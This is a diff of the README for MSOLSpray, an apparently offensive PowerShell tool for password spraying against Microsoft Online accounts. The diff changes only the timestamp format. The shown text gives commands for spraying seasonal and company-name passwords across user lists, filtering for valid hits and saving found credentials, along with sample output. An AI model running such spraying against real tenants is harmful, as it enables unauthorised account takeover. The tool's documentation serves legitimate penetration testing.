@@ -26,7 +26,7 @@ Open a PowerShell terminal from the Windows command line with 'powershell.exe -e
 PS C:\> Import-Module MSOLSpray.ps1
 PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com -Passwords Winter2020
 
-Time          : 2020-08-14 12:23:44
+Time          : 2020-08-15T18:20:50.1611349+02:00
 Username      : Steve@domain.com
 Password      : Winter2020
 IsValid       : True
@@ -38,12 +38,12 @@ ResponseError : None.
 ```PowerShell
 PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com,Klaas@domain.nl -Password Winter2020,Zomer2020 | Format-Table
 
-Time                Username         Password   IsValid ResponseError
-----                --------         --------   ------- -------------
-2020-08-14 12:25:15 Steve@domain.com Winter2020 True    None.
-2020-08-14 12:25:15 Klaas@domain.nl  Winter2020 False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 Steve@domain.com Zomer2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 Klaas@domain.nl  Zomer2020  True    None.
+Time                               Username         Password   IsValid ResponseError
+----                               --------         --------   ------- -------------
+2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2020 True    None.
+2020-08-15T18:20:50.1611349+02:00  Klaas@domain.nl  Winter2020 False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Zomer2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  Klaas@domain.nl  Zomer2020  True    None.
 ```
 
 ### Test multiple usernames and passwords using userlists and passwordlists
@@ -51,28 +51,28 @@ Time                Username         Password   IsValid ResponseError
 ```PowerShell
 PS C:\> Invoke-MSOLSpray -UsernameList C:\users.txt -PasswordList C:\seasons_year.txt,C:\company_name_special_characters.txt | Format-Table
 
-Time                Username         Password    IsValid ResponseError
-----                --------         --------    ------- -------------
-2020-08-14 12:25:15 Steve@domain.com Spring2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 John@domain.com  Spring020   False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 Steve@domain.com Summer2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 John@domain.com  Summer2020  True    None.
-2020-08-14 12:25:15 Steve@domain.com Fall2020    False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 John@domain.com  Fall2020    False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 Steve@domain.com Winter2020  True    None.
-2020-08-14 12:25:15 John@domain.com  Winter2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 Steve@domain.com Spring2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 John@domain.com  Spring2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 Steve@domain.com Summer2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 John@domain.com  Summer2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 Steve@domain.com Fall2019    False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 John@domain.com  Fall2019    False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 Steve@domain.com Winter2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 John@domain.com  Winter2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 Steve@domain.com Domain!     False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 John@domain.com  Domain!     False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 Steve@domain.com Domain@     False   AADSTS50126: Error validating credentials due to invalid username or password.
-2020-08-14 12:25:15 John@domain.com  Domain@     False   AADSTS50126: Error validating credentials due to invalid username or password.
+Time                               Username         Password    IsValid ResponseError
+----                               --------         --------    ------- -------------
+2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Spring2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  John@domain.com  Spring020   False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Summer2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2020  True    None.
+2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Fall2020    False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  John@domain.com  Fall2020    False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2020  True    None.
+2020-08-15T18:20:50.1611349+02:00  John@domain.com  Winter2020  False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Spring2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  John@domain.com  Spring2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Summer2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Fall2019    False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  John@domain.com  Fall2019    False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  John@domain.com  Winter2019  False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Domain!     False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  John@domain.com  Domain!     False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Domain@     False   AADSTS50126: Error validating credentials due to invalid username or password.
+2020-08-15T18:20:50.1611349+02:00  John@domain.com  Domain@     False   AADSTS50126: Error validating credentials due to invalid username or password.
 ```
 
 ### Filter output to only show valid passwords
@@ -80,10 +80,10 @@ Time                Username         Password    IsValid ResponseError
 ```PowerShell
 PS C:\> Invoke-MSOLSpray -UsernameList C:\users.txt -PasswordList C:\seasons_year.txt,C:\company_name_special_characters.txt | Where-Object {$_.IsValid -eq $true} | Format-Table
 
-Time                Username         Password    IsValid ResponseError
-----                --------         --------    ------- -------------
-2020-08-14 12:25:15 John@domain.com  Summer2020  True    None.
-2020-08-14 12:25:15 Steve@domain.com Winter2020  True    None.
+Time                               Username         Password    IsValid ResponseError
+----                               --------         --------    ------- -------------
+2020-08-15T18:20:50.1611349+02:00  John@domain.com  Summer2020  True    None.
+2020-08-15T18:20:50.1611349+02:00  Steve@domain.com Winter2020  True    None.
 ```
 
 ### Write valid passwords to a output file
@@ -93,7 +93,7 @@ PS C:\> Invoke-MSOLSpray -Usernames Steve@domain.com -Passwords Winter2020,Summe
 Valid results have been written to C:\outfile.txt
 
 PS C:\> Get-Content C:\outfile.txt
-2020-08-14 12:25:15 : Steve@domain.com : Winter2020 : None.
+2020-08-15T18:20:50.1611349+02:00 : Steve@domain.com : Winter2020 : None.
 ```
 
 ### Invoke-MSOLSpray Options
